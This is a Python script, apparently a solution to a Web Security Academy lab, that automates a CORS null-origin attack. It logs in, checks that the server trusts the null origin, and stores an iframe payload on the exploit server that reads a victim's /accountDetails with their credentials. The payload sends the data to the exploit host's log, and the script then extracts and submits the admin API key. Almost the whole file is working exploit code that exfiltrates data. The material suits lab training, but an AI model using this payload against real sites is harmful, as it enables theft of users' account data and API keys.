import requests
import re
from bs4 import BeautifulSoup
import sys
import urllib.parse

home_host = "{YOUR_HOST}.web-security-academy.net"
exploit_host = "exploit-{YOUR_EXPLOIT_HOST}.exploit-server.net"

login_path = '/login'
path_check = '/accountDetails'
path_store = '/'
view_log_exploit_path = '/log'

form_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
}

print("=== 1. Lấy Token và Session ban đầu ===")
res_get_login = requests.get(f"https://{home_host}{login_path}", headers=form_headers)
soup = BeautifulSoup(res_get_login.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
session_login = res_get_login.cookies.get('session')

print(f"[*] CSRF Token: {csrf_token}")

print("=== 2. Đăng nhập để kiểm tra CORS ===")
form_headers["Cookie"] = f"session={session_login}"
data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
res_post_login = requests.post(f"https://{home_host}{login_path}", headers=form_headers, data=data_login, allow_redirects=False)
session_user = res_post_login.cookies.get('session')

print(f"[*] Session User: {session_user}")

form_headers["Cookie"] = f"session={session_user}"
form_headers["Origin"] = "null"
res_cors = requests.get(f"https://{home_host}{path_check}", headers=form_headers)

if res_cors.headers.get('Access-Control-Allow-Origin') == 'null':
    print("[+] Tìm thấy lỗ hổng CORS!")
else:
    print("[-] Không tìm thấy lỗ hổng CORS. Dừng chương trình.")
    sys.exit()

print("=== 3. Cấu hình Exploit Server ===")
payload = f"""<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{home_host}/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {{
        location='https://{exploit_host}/log?key='+encodeURIComponent(this.responseText);
    }};
</script>"></iframe>"""

data_exploit = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody": payload,
    "formAction": "STORE"
}

del form_headers["Origin"]
if "Cookie" in form_headers: del form_headers["Cookie"]

print("[*] Đang lưu payload lên Exploit Server...")
res_store = requests.post(f"https://{exploit_host}{path_store}", data=data_exploit)

if res_store.status_code == 200:
    print("[+] Payload đã được lưu!")
else:
    print(f"[-] Lưu thất bại. Status: {res_store.status_code}")
    sys.exit()

print("=== 4. Gửi payload cho nạn nhân ===")
data_exploit["formAction"] = "DELIVER_TO_VICTIM"
res_deliver = requests.post(f"https://{exploit_host}{path_store}", data=data_exploit)

if res_deliver.status_code == 200:
    print("[+] Đã gửi cho nạn nhân thành công!")
else:
    print("[-] Không thể gửi cho nạn nhân.")
    sys.exit()

print("=== 5. Kiểm tra log để lấy API Key ===")
import time
time.sleep(3)

res_check_log = requests.get(f"https://{exploit_host}{view_log_exploit_path}")
if res_check_log.status_code == 200:
    found_keys = re.findall(r'key=(.*?)[\s\b<]', res_check_log.text)
    if found_keys:
        latest_encoded_key = found_keys[-1]
        decoded_json = urllib.parse.unquote(latest_encoded_key)
        api_key_match = re.search(r'"apikey"\s*:\s*"(.*?)"', decoded_json)
        if api_key_match:
            api_key = api_key_match.group(1)
            print(f"\n[!!!] KẾT QUẢ: API Key của Admin là: {api_key}")
        else:
            print("[-] Đã thấy log nhưng chưa thấy apikey trong dữ liệu.")
    else:
        print("[-] Log trống, nạn nhân có lẽ chưa truy cập.")
else:
    print("[-] Không thể truy cập log.")

print("=== Nộp solution bài lab ===")
data_solution={
    "answer": api_key
}
res_submit=requests.post(f"https://{home_host}"+"/submitSolution",headers=form_headers,data=data_solution)
if res_submit.status_code==200 and res_submit.json().get("correct")==True:
    print("[+] Chúc mừng! Bạn đã giải quyết thành công bài Lab.")
else:
    print("[-] Kết quả chưa chính xác.")